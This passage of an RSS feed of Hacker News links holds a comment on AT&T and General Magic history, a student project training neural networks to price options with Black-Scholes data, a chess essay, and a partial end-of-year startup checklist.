I think it was primarily tied to authenticating users and providing a rather clever user directory, but it was a start, and again, a core contractual item we were obligated to meet.</p><p>While AT&amp;T certainly had an issue with AOL, we never quite understood why General Magic didn't have an isssue with it (at least when we thought it was all Sony's doing), as it substantially compromised the value of it's whole Telescript proposition, which, despite various public pronouncements to the contrary, was obviously a distant second in importance internally to MagicCap. Various Magicians have indicated their disdain for John Sculley and Apple for upstaging General Magic's device - can you see the similarity AT&amp;T saw for the introduction of an AOL messaging app on MagicCap devices to Apple's action? We had a similar reaction to Motorola's tie up with an outfit named RadioMail. Perhaps you were involved with that one also.</p><p>2. We campaigned long and hard for a MagicCap for PC's sofware app as it became apparent that Sony's $800+ device wasn't likely to fly off of store shelves and Motorola's $1500+ device might not ever make it to market, along with the phantom devices of other alliance members Panasonic and Philips. Rich a company as we were, AT&amp;T could not afford to dole out Sony MagicLink's for free or very little to tens of thousands of customers, but we easily could have and would have distributed software to millions of customers for free, which we believe would have put tens of thousands of users on the PersonaLink network, generating revenue for both AT&amp;T and General Magic, and perhaps providing a "tandem" device-computer solution that would have benefited device partners - which was ultimately the architecture that won that generation of handheld devices.</p><p>Our requests went nowhere for quite awhile, and were ultimately undertaken by a too little, too late internal effort at General Magic that never produced a viable product. </p></div></div></div>]]>
            </description>
            <link>https://www.cake.co/conversations/6bNY8PD/that-time-in-1994-when-steve-jobs-got-to-use-a-device-like-an-iphone/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25199999</guid>
            <pubDate>Tue, 24 Nov 2020 16:35:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Neural Networks for Option Pricing]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25199972">thread link</a>) | @jptitus
<br/>
November 24, 2020 | https://samuellee19.github.io/CSCI145_Option_Pricing/ | <a href="https://web.archive.org/web/*/https://samuellee19.github.io/CSCI145_Option_Pricing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<h2 id="project-overview">Project Overview</h2>
<h3 id="background">Background</h3>
<p><strong>The Black Scholes model</strong> is used to price put and call options by estimating the variation over time said financial instruments. The model is based on the assumption that the markets are highly efficient (i.e., Efficient Market Hypothesis), which suggests that stock prices are uncorrelated to one another across time. As a result, Geometric Brownian Motion (GBM) also has been assumed. However, the assumption is often violated in practice, leading to numerous variations of the Black-Scholes model.</p>
<p>The <strong>Black-Scholes formula for European call and put options</strong> are:</p>
<p><span>\[C(S_0,t)=S_0N(d_1)-Ke^{-r(T-t)}N(d_2)\]</span> <span>\[P(S_0,t)=Ke^{-r(T-t)}N(-d_2)-S_0N(-d_1)\]</span> where<br>
- <span>\(S_0\)</span>: Stock Price<br>
- <span>\(C(S_0,t)\)</span>: Price of the Call Option<br>
- <span>\(K\)</span>: Exercise Price<br>
- <span>\((T-t)\)</span>: Time to Maturity, where T is Exercise Date<br>
- <span>\(\sigma\)</span>: Underlying Volatility (a standard deviation of log returns)<br>
- <span>\(r\)</span>: Risk-free Interest Rate (i.e., T-bill Rate)<br>
</p>
<p>The <span>\(d_i\)</span> variables are defined as: <span>\[d_1=\frac{\ln\frac{S_0}{K}+(r+\frac{\sigma^2}{2})(T-t)}{\sigma\sqrt{T-t}}\]</span> <span>\[d_2=d_1-\sigma\sqrt{T-t}=\frac{\ln\frac{S_0}{K}+(r-\frac{\sigma^2}{2})(T-t)}{\sigma\sqrt{T-t}}\]</span></p>
<p>Finally, <span>\(N(x)\)</span> is cumulative distribution function for the standard normal distribution.</p>
<h3 id="project-objectives">Project Objectives</h3>
<p>In this project, we aim to do the following:<br>
1. Recreate Culkin and Das’ work<br>
2. See whether fitted simulated model performs well on actual data<br>
3. Observe if the model can perform better based on different datasets</p>
<h2 id="methodologies">Methodologies</h2>
<h3 id="data">Data</h3>
<p>To recreate Culkin and Das’ work we utilized the same simulated data used in the paper to train and validate the neural network.</p>
<p>Aditionally, we queried UKX options data and the options’ underlying stock infromation from Bloomberg (see Bloomberg Query File). We also created another dataset by <a href="https://github.com/jknaudt21/Option-Scraper-BlackScholes">scraping</a> information for S&amp;P500 companies from Yahoo Finance and AlphaQuery.</p>
<h4 id="culkin-and-das-2017">1. Culkin and Das (2017)</h4>
<p>To train a neural network to learn the call option pricing equation, Culkin and Das (2017) simulated a range of call option prices with ranges of different parameters<span data-cites="Culkin_Das_2017">(Culkin and Das <a href="#ref-Culkin_Das_2017">2017</a>)</span>:</p>
<table>
<thead>
<tr>
<th>Parameter</th>
<th>Range</th>
</tr>
</thead>
<tbody>
<tr>
<td>Stock Price <span>\((S)\)</span></td>
<td>$10 — $50</td>
</tr>
<tr>
<td>Strike Price <span>\((K)\)</span></td>
<td>$7 — $650</td>
</tr>
<tr>
<td>Maturity <span>\((T-t)\)</span></td>
<td>1 day to 3 years</td>
</tr>
<tr>
<td>Dividend Rate <span>\((q)\)</span></td>
<td>0% — 3%</td>
</tr>
<tr>
<td>Risk Free Rate <span>\((r)\)</span></td>
<td>1% — 3%</td>
</tr>
<tr>
<td>Volatility <span>\((\sigma)\)</span></td>
<td>5% — 90%</td>
</tr>
<tr>
<td>Call Price <span>\((C)\)</span></td>
<td>$0 — $328</td>
</tr>
</tbody>
</table>
<p>In total, the dataset contains 300,000 observations.</p>
<h4 id="ukx-bloomberg-data">2. UKX Bloomberg Data</h4>
<p>This data is consisted of call options for stocks in the UKX 100 from Bloomberg Terminal. As Bloomberg Terminal has an upper bound for queries, this data only consists of 1600+ observations.</p>
<h4 id="sp-500-scraped-data">3. S&amp;P 500 Scraped Data</h4>
<p>To address a limited number of observations on the above data, we collected additional data through web scraping. Although web data may be imperfect, it can still hold useful information. For this dataset there are 57,000+ observations and we evaluate it separately from the addendum of UKX data.</p>
<h2 id="code">Code</h2>
<p>We used following dependencies and <code>scikit-learn</code>’s prebuilt models to train and visualize our results:</p>
<div data-layout="l-body">
<pre><code>
import numpy as np
from sklearn.neural_network import MLPRegressor
from sklearn.model_selection import train_test_split
from sklearn.metrics import mean_squared_error, r2_score
import pandas as pd
import matplotlib.pyplot as plt
import pickle
from scipy import stats
import matplotlib
matplotlib.rcParams['figure.dpi'] = 300</code></pre>
</div>
<h3 id="importing-and-preparing-training-data">Importing and Preparing Training Data</h3>
<table>
<colgroup>
<col>
<col>
<col>
<col>
<col>
<col>
<col>
<col>
</colgroup>
<thead>
<tr>
<th>Index</th>
<th>Stock Price</th>
<th>Strike Price</th>
<th>Maturity</th>
<th>Dividends</th>
<th>Volatility</th>
<th>Risk-free</th>
<th>Call Price</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>206.484</td>
<td>194.386</td>
<td>1.093</td>
<td>0.006</td>
<td>0.863</td>
<td>0.059</td>
<td>79.434</td>
</tr>
<tr>
<td>1</td>
<td>79.582</td>
<td>73.926</td>
<td>0.844</td>
<td>0.020</td>
<td>0.760</td>
<td>0.081</td>
<td>24.976</td>
</tr>
<tr>
<td>2</td>
<td>130.957</td>
<td>154.101</td>
<td>1.326</td>
<td>0.019</td>
<td>0.606</td>
<td>0.042</td>
<td>28.928</td>
</tr>
<tr>
<td>3</td>
<td>53.021</td>
<td>58.598</td>
<td>0.792</td>
<td>0.028</td>
<td>0.573</td>
<td>0.037</td>
<td>8.574</td>
</tr>
<tr>
<td>4</td>
<td>455.191</td>
<td>529.570</td>
<td>0.501</td>
<td>0.009</td>
<td>0.091</td>
<td>0.044</td>
<td>0.210</td>
</tr>
</tbody>
</table>
<p>The original dataset contains an unnecessary index column, so we dropped it from the data frame.</p>
<h4 id="normalizing-the-data-as-done-in-culkin-and-das">Normalizing the data (as done in Culkin and Das)</h4>
<p>As we know that the Black-Scholes formula is linear homogeneous in <span>\(C(S,K)\)</span>, we can normalize our data as: <span>\(C(S,K)/K=C(S/K,1)\)</span></p>
<p>Hence, the results are shown below:</p>
<table>
<colgroup>
<col>
<col>
<col>
<col>
<col>
<col>
<col>
<col>
</colgroup>
<thead>
<tr>
<th>Index</th>
<th>Stock Price</th>
<th>Strike Price</th>
<th>Maturity</th>
<th>Dividends</th>
<th>Volatility</th>
<th>Risk-free</th>
<th>Call Price</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>1.062</td>
<td>1.0</td>
<td>1.093</td>
<td>0.006</td>
<td>0.863</td>
<td>0.059</td>
<td>0.409</td>
</tr>
<tr>
<td>1</td>
<td>1.077</td>
<td>1.0</td>
<td>0.844</td>
<td>0.020</td>
<td>0.760</td>
<td>0.081</td>
<td>0.338</td>
</tr>
<tr>
<td>2</td>
<td>0.850</td>
<td>1.0</td>
<td>1.326</td>
<td>0.019</td>
<td>0.606</td>
<td>0.042</td>
<td>0.188</td>
</tr>
<tr>
<td>3</td>
<td>0.905</td>
<td>1.0</td>
<td>0.792</td>
<td>0.028</td>
<td>0.573</td>
<td>0.037</td>
<td>0.146</td>
</tr>
<tr>
<td>4</td>
<td>0.860</td>
<td>1.0</td>
<td>0.501</td>
<td>0.009</td>
<td>0.091</td>
<td>0.044</td>
<td>0.000</td>
</tr>
</tbody>
</table>
<h3 id="training-the-model">Training the model</h3>
<p>To remain as faithful to Culkin and Das, we trained the neural network with the following parameters:<br>
- 4 hidden fully connected layers, each with 100 neurons<br>
- Batch size of 64<br>
- 10 training epochs<br>
- 80-20 train-validation split<br>
- Mean Squared error as loss function</p>
<p>The main difference between our model and the paper’s model is that our network uses ReLU as the activation function for every layer, instead of using LeakyReLU, ELU, ReLU, and ELU for the four layers respectively. We also did not employ dropout regularization. Lastly, we opted to use “Adam” as our optimizer rather than stochastic gradient descent.</p>
<div data-layout="l-body">
<pre><code>
np.random.seed(32)
X_train, X_test, y_train, y_test = train_test_split(df.drop('Call Price', axis=1), 
                                                    df['Call Price'], test_size=0.2)

mlp = MLPRegressor(hidden_layer_sizes=(100,100,100,100), 
                   solver='adam', shuffle = False, batch_size=64, verbose=True,
                   max_iter= 10
                    ) </code></pre>
</div>
<h2 id="analysis-and-visualization">Analysis and Visualization</h2>
<p>We started by exploring the most basic performance metric for every regression problem: <span>\(R^2\)</span></p>
<div data-layout="l-body">
<pre><code>
print("Training set score: %f" % mlp.score(X_train, y_train))
print("Test set score: %f" % mlp.score(X_test, y_test))</code></pre>
</div>
<p>We received <span>\(R^2\)</span> values (training and test) of 0.999476 and 0.999474.</p>
<p>We can see that the model produced very promising results from the simulated data. While the results show that the algorithm is able to learn option pricing mechanism, we cannot draw any significant conclusion that it can produce meaningful results in real life situation.</p>
<p>We can visualize the succes of the model in the graph below:</p>
<p><img src="https://samuellee19.github.io/CSCI145_Option_Pricing/BS_Model_draft/output_27_0.png" width="257"></p>
<p>We can also explore the distribution of both the in-sample and out of sample error:</p>
<p><img src="https://samuellee19.github.io/CSCI145_Option_Pricing/BS_Model_draft/output_29_0.png" width="268"></p>
<p><img src="https://samuellee19.github.io/CSCI145_Option_Pricing/BS_Model_draft/output_30_0.png" width="268"></p>
<div data-layout="l-body">
<pre><code>
rmse = mean_squared_error(preds_test, y_test)**0.5; rmse # root mean squared error
print("RMSE: %.4f" % rmse)</code></pre>
</div>
<p>Root Mean Square Error of the prediction is 0.0041. Hence, the pricing error in the training set can be summarized as below:</p>
<table>
<thead>
<tr>
<th>Number of Observations</th>
<th>minmax</th>
<th>mean</th>
<th>variance</th>
<th>skewness</th>
<th>kurtosis</th>
</tr>
</thead>
<tbody>
<tr>
<td>240,000</td>
<td>(-0.045, 0.039)</td>
<td>-0.003</td>
<td>0.000007</td>
<td>-0.400</td>
<td>12.084</td>
</tr>
</tbody>
</table>
<p>The pricing error in the test set can be summarized as below:</p>
<table>
<thead>
<tr>
<th>Number of Observations</th>
<th>minmax</th>
<th>mean</th>
<th>variance</th>
<th>skewness</th>
<th>kurtosis</th>
</tr>
</thead>
<tbody>
<tr>
<td>11,841</td>
<td>(-1.407,204.185)</td>
<td>0.091</td>
<td>10.957</td>
<td>54.036</td>
<td>3,074.578</td>
</tr>
</tbody>
</table>
<h2 id="validating-with-real-data">Validating with real data</h2>
<p>So far, we have observed the behavior of the model using the synthetic data. Though the use of synthetic data has allowed us to learn the Black-Scholes model quite accurately, we have yet to see how the model performs using real data. Plus, we could also gauge whether models trained in real data are able to better price options in the market.</p>
<p>Nonetheless, it is worth noting that a common option trading strategy is to determine whether an option is undervalued or fairly valued with respect to the market’s price and the price outputed by Black-Scholes. With this in mind, if our model misprices an option with a higher price, it could be an indicator that said option is undervalued.</p>
<p><strong>Important</strong>: by the time the data for this article was collected, the current risk-free rate was 0.88%.</p>
<h3 id="ukx-bloomberg-data-1">UKX Bloomberg Data</h3>
<p>To start the validation, we pulled options data using a Bloomberg terminal. To limit the size of query, we extracted the data for around ~1600 calls on stocks in the UKX100.</p>
<table>
<thead>
<tr>
<th></th>
<th>Stock Price</th>
<th>Strike Price</th>
<th>Maturity</th>
<th>Dividends</th>
<th>Volatility</th>
<th>Risk-free</th>
<th>Call Price</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>4,732.0</td>
<td>1.0</td>
<td>0.09</td>
<td>0.000000</td>
<td>0.392</td>
<td>0.0088</td>
<td>4,731.0</td>
</tr>
<tr>
<td>1</td>
<td>4,732.0</td>
<td>1.0</td>
<td>0.34</td>
<td>11.949099</td>
<td>0.392</td>
<td>0.0088</td>
<td>4,731.0</td>
</tr>
<tr>
<td>2</td>
<td>4,732.0</td>
<td>1.0</td>
<td>0.02</td>
<td>0.000000</td>
<td>0.392</td>
<td>0.0088</td>
<td>4,731.0</td>
</tr>
<tr>
<td>3</td>
<td>2,094.0</td>
<td>1.0</td>
<td>0.09</td>
<td>0.000000</td>
<td>0.530</td>
<td>0.0088</td>
<td>2,093.0</td>
</tr>
<tr>
<td>4</td>
<td>2,094.0</td>
<td>1.0</td>
<td>0.34</td>
<td>4.424667</td>
<td>0.530</td>
<td>0.0088</td>
<td>2,093.0</td>
</tr>
</tbody>
</table>
<p>Though it might seem that this data is normalized already, such is not the case. Therfore, we normalize the data by dividing by the strike.</p>
<p>We proceeded with dropping <code>Call Price</code> column on the data and predicted to see how the model performs.</p>
<p><img src="https://samuellee19.github.io/CSCI145_Option_Pricing/BS_Model_draft/output_40_0.png" width="263"></p>
<p>From a quick glance, there seems to be some minor deviations. In fact, we got <span>\(R^2\)</span> value of 0.8699. We can also see the distribution of the errors. Since the simulated data were not generated under a normal distribution, it would not be surprising to observe a skewed distribution:</p>
<p><img src="https://samuellee19.github.io/CSCI145_Option_Pricing/BS_Model_draft/output_44_0.png" width="263"></p>
<p>While the model performed worse relative to previous sample, it still achieved a high R-squared value considering that the training data and the test data came from different sources. Hence, the above graph is summarized as below:</p>
<table>
<thead>
<tr>
<th>Number of Observations</th>
<th>minmax</th>
<th>mean</th>
<th>variance</th>
<th>skewness</th>
<th>kurtosis</th>
</tr>
</thead>
<tbody>
<tr>
<td>1,685</td>
<td>(-3,088.616,0.352)</td>
<td>-28.828</td>
<td>44,608.131</td>
<td>-10.457</td>
<td>123.588</td>
</tr>
</tbody>
</table>
<p>It makes sense that a model trained from the simulated data would perform relatively bad. However, a real question is whether neural network can perform well given real data that is not normally distributed.</p>
<p>To mitigate the effect of having less data, we increased the number of epochs:</p>
<div data-layout="l-body">
<pre><code>
np.random.seed(32)
X_train_ukx, X_test_ukx, y_train_ukx, y_test_ukx = train_test_split(ukx.drop('Call Price', axis=1), 
                                                    ukx['Call Price'], test_size=0.2)

mlp_u = MLPRegressor(hidden_layer_sizes=(100,100,100,100), 
                   solver='adam', shuffle = False, batch_size=64, verbose=True,
                   max_iter= 20
                    )

mlp_u.fit(X_train_ukx, y_train_ukx)</code></pre>
</div>
<p>Hence, the model achieved <span>\(R^2\)</span> values of 0.999998 and 0.999998 for training and testing sets.</p>
<p><img src="https://samuellee19.github.io/CSCI145_Option_Pricing/BS_Model_draft/output_51_0.png" width="259"></p>
<table>
<thead>
<tr>
<th>Number of Observations</th>
<th>minmax</th>
<th>mean</th>
<th>variance</th>
<th>skewness</th>
<th>kurtosis</th>
</tr>
</thead>
<tbody>
<tr>
<td>337</td>
<td>(-0.316,9.836)</td>
<td>0.164</td>
<td>0.804</td>
<td>7.901</td>
<td>69.226</td>
</tr>
</tbody>
</table>
<p>From the above, we can see that the model was able to perform very well, given that there were only 1,685 observations used for training the model. However, one thing to note is that the result exhibits a very <strong>high kurtosis</strong>: while the model is consistent in most cases, it could lead to a severe gain/loss (long tails) from time to time. In real-life application, such model will not be preferred by the practitioners as …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://samuellee19.github.io/CSCI145_Option_Pricing/">https://samuellee19.github.io/CSCI145_Option_Pricing/</a></em></p>]]>
            </description>
            <link>https://samuellee19.github.io/CSCI145_Option_Pricing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25199972</guid>
            <pubDate>Tue, 24 Nov 2020 16:33:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why I've Liked Chess So Much]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25199971">thread link</a>) | @naftaliharris
<br/>
November 24, 2020 | https://www.naftaliharris.com/blog/why-ive-liked-chess-so-much/ | <a href="https://web.archive.org/web/*/https://www.naftaliharris.com/blog/why-ive-liked-chess-so-much/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <p>November 22, 2020</p>
  
<p>
I've liked chess off and on for twenty years. I don't remember learning to play but I do remember an after school class and losing repeatedly to my dad and cousin when I was little. When I taught myself to program my first real project was making a chess engine, though it could only search to depth two since I didn't know about recursion. In college I played casually and was arguably the third best player in my house. I learned more about programming there and made a <a href="https://www.naftaliharris.com/blog/chess">better engine</a> that was good enough to beat me consistently and even <a href="https://www.naftaliharris.com/blog/chess-puzzle">beat another weak engine</a> once or twice. These days I occasionally <a href="https://lichess.org/">play online</a>, I usually do a few puzzles a day, and I watch <a href="https://www.youtube.com/channel/UCMxK1FKAbmj2N-faTWLwNig">Mato Jelic</a> and <a href="https://www.youtube.com/channel/UC6hOVYvNn79Sl1Fc1vx2mYA">John Bartholomew</a> to relax.
</p>
<p>
Considering how long I've played chess I've never been very good at it. Today I'm arguably the second best in my office. I'm a little above 1500 on lichess 5+3 blitz, which I'm somewhat proud of because that's above the provisional rating you get when you join. I've never played on a team or in a tournament or even played a game under classical time controls. I play the Ruy Lopez and the Najdorf Sicilian but am usually out of book after six moves or so and don't have a response I love to d4. Most games I play have at least one blunder or missed opportunity from me. I'd probably still lose to my cousin but I'm pretty sure I'd beat my dad today. People say "oh I'm sure you're just being modest" when I say I'm not very good but I'm actually not being modest.
</p>
<p>
Chess is one of the few things that's been a part of my life for so long that I'm not good at. Though I've long enjoyed the game I've never devoted the time and focus to really improve. There have even been a few several year periods of my life when I wasn't thinking about chess at all. But sure enough I'd stumble across a board or see a game and get back into it.
</p>
<p>
So why have I liked this game so much? There are so many answers to that for me and in the rest of this post I try to scratch the surface of it. The common thread though is that chess is incredibly beautiful and I see many aspects of life as I've experienced it so far reflected in it. I haven't read "How Life Imitates Chess" yet but I greatly admire Kasparov's play and post-chess life and imagine I'd enjoy it a lot.
</p>

<h2>Knots and Gnarls</h2>
<p>
Chess is full of rules, exceptions, and exceptions to those exceptions. For example, each chess piece is unique and different, with its own very contextful strengths and weaknesses. Some of them move in unusual ways (pawns, knights, castling, or en-passant) and this makes chess somewhat complicated to learn. Kings are vulnerable and weak... until the endgame when they become fearless and aggressive. Queens are the most powerful piece, but run away a lot since they're usually too valuable to risk. Rooks can be a fearsome battering ram or an impenetrable laser, but are also surprisingly awkward to maneuver. Bishops are great in open positions but can only visit half the squares of the board and can be worse than useless if blocked in. Knights are proud (and on the fifth or six rank you could even call them arrogant), but miraculously generally about as valuable as the straight-laced bishop. The humble pawn is the weakest piece but nonetheless the "soul of chess" and very occasionally the star of a rags to riches story.
</p>
<p>
Some criticize chess for these quirks and compare it unfavorably to Go but I believe this makes chess reflect the knottiness and irregularity of human interaction, history, and society. Humans are not spheres, we use base ten rather than two, and the streets and buildings of our cities whisper stories of those who came before us. How fitting it is that chess has these quirks as well.
</p>

<h2>Life's Journey</h2>
<p>
When you make your first few moves in a game, you are embarking on the same highway that the greatest players of the game and millions of your ancestors have also walked. A couple moves later and you're on a quieter and more obscure road, with perhaps a few local experts but a lot less fanfare. And a few moves after that, despite the billions of games that have been played, you or your opponent will be the first person ever to make a particular move, and from that point on you'll be blazing your own path.
</p>
<p>
I think this reflects the same pull of history, culture, and tradition that influences all of us. As we grow up we learn to walk and talk and share many experiences that others have had before us, but we gradually grow into our own unique person and one day start leading our own lives. It's mind boggling, awe-inspiring, and almost sacrilegious that you can recreate this in a five minute blitz game. Some bemoan memorizing opening lines and promote variants like Fischer Random but I enjoy and am proud to learn from the wisdom of our predecessors and to join in the vast distributed discovery of the secrets of our shared game.
</p>
<p>
Above a certain level, you can't win games by playing solidly and simply waiting for your opponent to make a mistake. Rather, you must learn to formulate a plan and execute on it while either frustrating the plan of your opponent or executing yours faster and making them react. Chess, like life, rewards the person who knows what he or she wants and goes out and seizes it with initiative. Before I understood this I didn't mind playing with the black pieces, but now I always feel a small thrill to be assigned white. When you have the initiative you can feel it in your hands and your pulse, and as in life it feels good to be living your plan as opposed to somebody else's.
</p>
<p>
Part of that planning process involves understanding what's important now and what will be important in the future. Strong players fight over progressively more subtle advantages... open files, a well placed piece, better pawn structures, control of a square, many of which don't seem to be immediately relevant. To play at that level involves understanding what the future will hold and preparing for it today.
</p>

<h2>Unknown Objective Reality</h2>
<p>
Every possible chess position is either a win, loss, or a draw under perfect play. But with the very limited exception of certain endgames and "mate in n" positions, for almost any position (including of course the starting one) nobody knows with certainty which it is. This is despite the fact that every player intuitively knows the algorithm to solve chess and every chess engine, left to run infinitely on the opening position, would do so.
</p>
<p>
Similarly, I believe there is a single reality in life. Sometimes we have a pretty good sense of what that is, sometimes not, and sometimes reasonable people disagree on it. Unfortunately, except in certain limited situations (notably mathematics), this reality is usually impossible to know with near certainty.
</p>
<p>
Many people believe that chess is a draw. Although I wouldn't be surprised if it were, I think this reasoning generally extrapolates from the play of our best players or engines and implicitly assumes that perfect play would have similar characteristics, an assumption I don't think is warranted. With today's technology of course we'll never know.
</p>

<h2>The Human Spirit</h2>
<p>
Chess brings out some of the human characteristics I most admire. The best players are creative, confident, tough, clear-eyed, prepared. You can't watch the games of Mikhail Tal or Judit Polgar and not be moved by their will to win, their fearlessness, and their fighting spirit, or see their personalities come through their games. I'm proud to say that no matter who my opponent is I always play to win.
</p>
<p>
The struggle between two players pouring their soul into a game produces a piece of art. One player makes a threat, the other ignores it and makes a greater threat, the first parries it while simultaneously increasing the tension elsewhere. Each player's best ideas wrestle and produce a beautifully violent dance. The thing that pains me the most about not being good at chess isn't losing games (though this does significantly impact my mood) but rather ruining this work of art by hanging a piece or missing a combination. There's a debate about whether chess is a sport but I think a more apt description is a competitive art form.
</p>
<p>
What to make of the fact then that engines easily beat the best human players today? Are they closer to the "human ideal" than we are? I don't think so. When humans play they pour their personality and spirit into the game, regardless of their skill level. While Magnus Carlsen is a far better player than me he isn't any more human than I am. We anthropomorphize engines sometimes but they are not sentient. They cannot invest emotionally into their games and so their wins are without joy and their losses are without sorrow.
</p>
<p>
When Garry Kasparov lost to Deep Blue in the '90s some people thought the game would be over. But a few decades later it's clear that the existence of strong engines hasn't diminished the game, any more than cameras have diminished the art of painting. In fact, engines have made it easier to analyze games and improve your play, at the minor cost of the occasional cheating scandal. Chess is certainly not over for me or the millions of others around the world that love this game.
</p>

<h2>The Next Twenty Years</h2>
<p>
I don't know if I'll get any good at chess in the next twenty years. My only hope I get as much from it in the next two decades as I've gotten from it in the last two. What a beautiful game.
</p>


  

  <h3>You might also enjoy...</h3>
  

</div></div>]]>
            </description>
            <link>https://www.naftaliharris.com/blog/why-ive-liked-chess-so-much/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25199971</guid>
            <pubDate>Tue, 24 Nov 2020 16:33:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Quicklang.net – A Simple Programming Language That Runs in the Browser]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25199865">thread link</a>) | @chkas
<br/>
November 24, 2020 | https://quicklang.net/ide/ | <a href="https://web.archive.org/web/*/https://quicklang.net/ide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://quicklang.net/ide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25199865</guid>
            <pubDate>Tue, 24 Nov 2020 16:24:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My EOY Reflection Checklist]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 17 (<a href="https://news.ycombinator.com/item?id=25199785">thread link</a>) | @opsgal
<br/>
November 24, 2020 | https://boringstartupstuff.com/newsletter/nov-24th-2020-finish-the-year-strong | <a href="https://web.archive.org/web/*/https://boringstartupstuff.com/newsletter/nov-24th-2020-finish-the-year-strong">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em><strong>The End-of-Year Checklist</strong><span>&nbsp;</span></em><em><span></span></em></p>
<p><span>I like starting the year with an empty to-do list and a fresh perspective. As an obsessive list maker, this process naturally starts with another list. Some of the questions can be treated as action items, but many require deeper reflection (perfect for the quiet week at the end of the year). I hope that you find it useful as you close out 2020!</span></p>

<h5><strong>As a Company</strong></h5>
<ul>
<li><span>What actions most moved the company forward and how can we double down on them? What should we have spent less time doing?&nbsp;</span></li>
<ul>
<li><span>Using the </span><a href="https://www.forbes.com/sites/kevinkruse/2016/03/07/80-20-rule/?sh=15a5959d3814"><span>Pareto Principle</span></a><span>, the return on certain actions will significantly outweigh others.</span></li>
</ul>
<li><span>Did our actions reflect our values? Did we call out times that employees personified our values? Do we need to add or subtract values?</span></li>
<li><span>Which relationships are most important to our success (e.g. customers, investors, partners) and what can we be doing to provide them with more value?</span></li>
</ul>

<h5><strong>As a Manager</strong><span>&nbsp;</span></h5>
<ul>
<li><span>Do we have the </span><a href="https://www.jimcollins.com/concepts/first-who-then-what.html"><span>right people on the bus</span></a><span>?</span></li>
<li><span>Are the right people owning the right things or are there better ways that we can be distributing the work?</span><br><span></span><span></span></li>
</ul>

<p><span>I keep a Trello board to manage this; <a data-cke-saved-href="https://trello.com/b/v6lu8Xpc" href="https://trello.com/b/v6lu8Xpc" target="_blank" rel="noopener">steal my template here</a>.</span></p>
<p><img src="https://cdn.buttercms.com/j9hSXZluRBG3S2HjajIu" alt="trello chart" width="683" height="158"></p>
<ul>
<li><span>How were my 1:1s? Did my reports walk away feeling that I had removed blockers, clarified vagueness, and given clear instructions?</span></li>
<li><span>Do my reports know their metrics for success?</span></li>
<li><span>How connected is the team overall?</span><strong></strong><span></span></li>
</ul>
<h5><strong>Meetings</strong><span>&nbsp;</span></h5>
<ul>
<li><span>Is every meeting on my calendar still relevant and useful?</span></li>
<li><span>Have I invited the right people to each one?</span></li>
<li><span>Are the major meetings for the upcoming year already scheduled? Mine are:</span>
<ul>
<li><span>Off-sites</span></li>
<li><span>Customers business reviews</span></li>
<li><span>Employee reviews</span></li>
<li><span>Team town halls</span></li>
<li><span>Quarterly kickoffs</span></li>
<li><span>Annual trainings</span></li>
</ul>
</li>
<li><span>Do I like the cadence and timing of my recurring meetings?</span>
<ul>
<li><span>Can I schedule any back-to-back to minimize distractions?</span></li>
<li><span>Are meetings optimized to my energy peaks?</span>
<ul>
<li><span>I’m fresh and driven in the mornings and do my best work then. Mentally challenging meetings are best during this window.</span></li>
<li><span>My mind is more relaxed and able to freely brainstorm in the afternoons; I shift most meetings to this time.</span>&nbsp;</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5><strong>Tools</strong></h5>
<ul>
<li><span><span>Are we using the right tools (software, banking, equipment, etc.) to accomplish our goals? Can we eliminate any?</span></span></li>
</ul>
<figure><img src="https://cdn.buttercms.com/exgcpuvKRdmBDDBzKUvF" alt="saas-list" width="772" height="101">
<figcaption>
<p><span>This number balloons quickly, so I keep a spreadsheet of all our tools to track which are still in use and who has access.</span></p>
</figcaption>
</figure>
<ul>
<li><span>Do the right people have access to each tool? Has admin access been given to the logical person?</span></li>
<li><span>Do we have the right tier of service for our size?</span></li>
<li><span>Are there more effective tools available that could reduce or combine the efforts of others?&nbsp;</span></li>
</ul>
<h5><strong>Finance</strong></h5>
<ul>
<li><span>Are our finances generally in order? This can include:</span></li>
<ul>
<li><span>Outstanding invoices</span></li>
<li><span>Unpaid bills</span></li>
<li><span>Sales commissions</span></li>
<li><span>Expense reconciliation</span></li>
<li><span>Credit card charges</span></li>
</ul>
<li><span>Are there areas that we could cut costs next year?</span></li>
<li><span>Is billing set to preferred person and method? (I like to see every charge come through and to optimize points based on spend.)</span></li>
</ul>

<h5><strong>Operations</strong></h5>
<ul>
<li><span>Where can we automate tasks?</span></li>
<li><span>Are the company files clean and organized? What about mine?</span></li>
<ul>
<li><span>If a company file no longer seems relevant, I dump it into an archive folder rather than delete anything.</span></li>
<li><span>I run an inbox-zero on my file downloads and desktop, forcing myself to put any important files somewhere safe in case something happens to my computer.</span></li>
</ul>
<li><span>Are our templated documents up to date?</span></li>
<ul>
<li><span>Check company address, point of contact, and legalese on contracts, mNDAs, etc.</span></li>
</ul>
<li><span>How are our processes? Which ones are sloppy, overly prescriptive, or begging to be eliminated entirely?</span></li>
</ul>

<h5><strong>Performance</strong></h5>
<ul>
<li><span>How did I perform against my job description?</span></li>
<ul>
